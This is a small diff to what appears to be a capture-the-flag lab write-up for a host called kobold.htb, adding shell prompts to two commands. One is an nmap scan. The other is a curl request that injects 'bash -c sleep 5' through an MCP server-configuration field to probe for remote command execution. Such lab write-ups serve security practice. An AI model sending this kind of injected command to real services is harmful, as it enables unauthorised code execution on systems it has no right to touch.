@@ -35,7 +35,7 @@ PORT     STATE SERVICE
 3552/tcp open  taserver
 
 Nmap done: 1 IP address (1 host up) scanned in 1121.49 seconds
-nmap -p 3552 -sC -sV 10.129.11.134
+$ nmap -p 3552 -sC -sV 10.129.11.134
 Starting Nmap 7.80 ( https://nmap.org ) at 2026-03-24 01:26 CST
 Nmap scan report for kobold.htb (10.129.11.134)
 Host is up (0.26s latency).
@@ -156,5 +156,5 @@ async function _ht() {
 }
 ```
 ```bash
-curl -k https://mcp.kobold.htb/api/mcp/connect -H "Content-Type: application/json" -d '{"serverId":"pwn", "serverConfig":{"command":"bash", "args": ["-c", "sleep 5"],"env": {}}}'
+$ curl -k https://mcp.kobold.htb/api/mcp/connect -H "Content-Type: application/json" -d '{"serverId":"pwn", "serverConfig":{"command":"bash", "args": ["-c", "sleep 5"],"env": {}}}'
 ```
